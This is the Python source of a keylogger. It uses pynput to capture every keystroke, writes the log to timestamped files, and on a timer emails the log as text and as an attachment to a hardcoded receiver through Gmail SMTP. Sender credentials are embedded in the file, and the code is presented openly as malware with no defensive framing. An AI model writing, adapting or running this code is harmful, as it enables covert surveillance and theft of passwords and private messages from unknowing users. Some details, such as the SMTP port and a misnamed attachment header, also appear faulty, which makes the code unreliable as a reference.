#!/usr/bin/env python
# -*- coding: utf-8 -*-
# reading writing to files

# getting keystrokes
from pynput import keyboard

#for emailing
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# for measuring dates and timers
from threading import Timer
from datetime import datetime

# static variables
EMAIL = "keypoggers@gmail.com"
EMAILPASS = "ZDSBNJKHF!62ukzhgkuyfwuS@D%@!3ndhvgwe"
SECINDAY = 86400
EMAILRECIVE = "keypogreciver@gmail.com"
LOGGING = True


class KeyLogger:
    def __init__(self, interval):
        self.interval = interval
        # the string that logs keystrokes
        self.log = ""
        # records date and time of starting and ending
        self.startDate = datetime.now()
        self.endDate = datetime.now()
        self.filename = ""
        self.start()

    def on_press(self, key):
        # here is where we detect keys
        name = str(key)
        if len(name) > 1:
            # for special keys
            if name == "Key.space":
                name = " "
            elif name == "Key.enter":
                name = "[ENTER]\n"
            elif name == "Key.backspace":
                name = "[Del]"
                self.log = self.log[:-1]
        name = name.replace("Key.", "")
        name = name.replace("\'", "")
        print(name)  # testing purposes
        self.log += name
        print(self.log)  # testing purposes

    def naming(self):
        self.endDate = datetime.now()
        startdatestr = str(self.startDate).replace(" ", "-").replace(":", "")
        enddatestr = str(self.endDate).replace(" ", "-").replace(":", "")
        self.filename = "keylog-"+str(startdatestr)+"-"+str(enddatestr)

    def filehandler(self):
        print(self.filename)
        # try and finally block so that the file closes safely
        f = open(str(self.filename) + ".txt", 'w')
        f.write(self.log)
        f.close()

    def carrierPidgeon(self, email, password, reciver, logstr, subject):
            # subject will act as the subject and file name to keep code more simple
            # for attatching files
            # setting up MIMEMultipart (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)

            mime = MIMEMultipart()
            mime['From'] = email
            mime['To'] = reciver
            mime['Subject'] = subject
            # body and attatchments
            mime.attach(MIMEText(logstr, 'plain'))
            attach_file_name = subject
            attach_file = open(attach_file_name, 'rb')

            payload = MIMEBase('application', 'octate-stream')
            payload.set_payload((attach_file).read())
            encoders.encode_base64(payload)  # encodes attatchment
            # add header with filename
            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
            mime.attach(payload)

            # connect to mail server
            server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
            server.starttls()
            # logging in
            server.login(email, password)
            text = mime.as_string()
            server.sendmail(email, reciver, text)
            server.quit()

    def report(self):
        if self.log:
            self.endDate = datetime.now()
            self.filehandler()
            # emailing
            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
            self.log = ""
            self.startDate = datetime.now()

        timer = Timer(interval=self.interval, function=self.report)
        # start the timer
        timer.start()

    def start(self):
        self.startDate = datetime.now()
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.report()


if __name__ == "__main__":
    # make interval SECINDAY after done testing
    k = KeyLogger(interval=60)
